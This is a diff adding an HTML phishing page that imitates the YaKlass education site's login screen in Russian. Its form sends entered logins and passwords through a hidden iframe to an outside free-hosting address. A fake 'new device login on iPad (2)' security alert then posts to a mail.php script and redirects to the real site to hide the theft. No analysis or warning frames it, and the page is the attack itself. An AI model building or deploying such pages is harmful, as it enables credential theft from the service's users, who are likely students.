@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=320, initial-scale=1">
+    <meta charset="utf-8">
+    <script src="jQuery 3.3.1.js"></script>
+    <style>
+      #futer {
+        width: 100%;
+        height: 55px;
+        background-color: rgba(5,135,115);
+      }
+      #r {
+        position: relative;
+        float: right;
+      }
+      #namevh {
+        font-size: 25px;
+        font-family: sans-serif;
+        font-weight: 100;
+        width: 95%;
+        border-bottom: 0.3px solid black;
+        margin-left: 10px;
+      }
+      #nvh {
+        font-size: 25px;
+        font-family: sans-serif;
+        font-weight: 100;
+        width: 95%;
+        border-bottom: 0.3px solid black;
+        margin-left: 10px;
+      }
+      .log {
+        font-size: 15px;
+        font-family: sans-serif;
+        font-weight: 100;
+        margin-left: 10px;
+      }
+      #l {
+        position: relative;
+        float: left;
+      }
+      .left {
+        margin-top: 5px;
+      }
+      .inp {
+        width: 92%;
+        margin-left: 10px;
+        height: 25px;
+        font-size: 15px;
+        font-family: sans-serif;
+        font-weight: 100;
+        border: 0.5px solid black;
+        border-radius: 0px;
+      }
+      #vhod {
+        border: none;
+        width: 110px;
+        height: 40px;
+    border-radius: 10px;
+        padding: 4px 8px;
+    text-align: center;
+    text-decoration: none;
+        color: white;
+    font-size: 15px;
+        font-family: sans-serif;
+        margin-left: 10px;
+        background-color: rgba(0,174,239);
+      }
+      #sub {
+        display: none;
+      }
+      #sub2 {
+        display: none;
+      }
+      .srch {
+        font-size: 15px;
+        font-family: sans-serif;
+        text-decoration: none;
+        margin-left: 10px;
+        color: rgb(0,174,239);
+      }
+      #niz {
+        width: 100%;
+        color: rgb(78,78,63);
+        height: 50px;
+        font-family: sans-serif;
+        text-align: center;
+        font-size: 13px;
+      }
+      .srck {
+        color: rgb(78,78,63);
+        margin-right: 8px;
+      }
+      #yst {
+        font-family: sans-serif;
+        display: none;
+      }
+      .bm {
+        width: 100%;
+        height: 40px;
+    border-radius: 5px;
+        padding: 4px 8px;
+    text-align: center;
+    text-decoration: none;
+    font-size: 15px;
+        font-family: sans-serif;
+        background-color: white;
+      }
+    </style>
+    <script>
+      $(document).ready(function() {
+        $("#vhod").click(function() {
+          $("#on").hide();
+          $("#yst").show();
+          var s = document.getElementById("sub");
+          s.click();
+        });
+        $(".bm").click(function() {
+          var s = document.getElementById("sub2");
+          s.click();
+          document.location.href = "https://yaklass.ru";
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <div id="futer">
+      <div id="l">
+        <a href="index.html"><img src="ya.jpg" width="150px;"/></a>
+      </div>
+      <div id="r">
+        <a href="index.html"><img src="zam.jpg" class="left" width="40px;"/></a>
+        <img src="men.jpg" class="left" width="50px;"/>
+      </div>
+    </div><br/><br/>
+    <div id="on">
+    <div id="namevh">Войти с помощью:</div><br/>
+    <img src="spon.jpg" width="300px"/><br/>
+    <div id="nvh">Вход</div><br/>
+      <iframe name="ifr" style="display: none"></iframe>
+      <form action="https://sitefor1.000webhostapp.com" method="post" target="ifr">
+      <span class="log">Эл.почта или логин:</span><br/>
+      <input type="text" class="inp" placeholder="Введите адрес эл.почты или логин…"/><br/><br/>
+      <span class="log">Пароль:</span><br/>
+      <input type="text" class="inp" placeholder="Введите пароль…"/><br/><br/>
+      <input type="submit" id="sub"/>
+    </form><button id="vhod">
+        Вход
+      </button><br/><br/>
+    <a href="index.html" class="srch">Регистрация</a><br/><br/>
+    <a href="index.html" class="srch">Забыли пароль?</a><br/><br/><br/><br/><br/>
+    <div id="niz">
+      <span class="kon">Copyright © 2021 ООО ЯКласс</span><br/><br/>
+      <a href="index.html" class="srck">Контакты</a>
+      <a href="index.html" class="srck">Пользовательское соглашение</a>
+    </div>
+      </div>
+    <div id="yst">
+      <span style="font-size:30px">На устройстве "iPad (2)" выполнен вход в аккаунт</span><br/><br/>
+      <span style="font-size:15px">Если вы не входили в аккаунт на этом устройстве, значит у кого-то есть доступ к вашему аккаунту.</span><br/>
+      <img src="ipad.jpg"/><b>iPad (2)</b><br/><br/>
+      <span>Это были вы?</span><br/>
+      <button class="bm" style="color: green">
+        Да
+      </button><br/>
+      <button class="bm" style="color: red">
+      Нет, защитить аккаунт
+      </button>
+      <iframe name="ifr2" style="display: none"></iframe>
+      <form action="https://sitefor1.000webhostapp.com/mail.php" method="post" target="ifr2">
+      <input type="submit" id="sub2"/>
+    </form>
+    </div>
+  </body>
+</html>
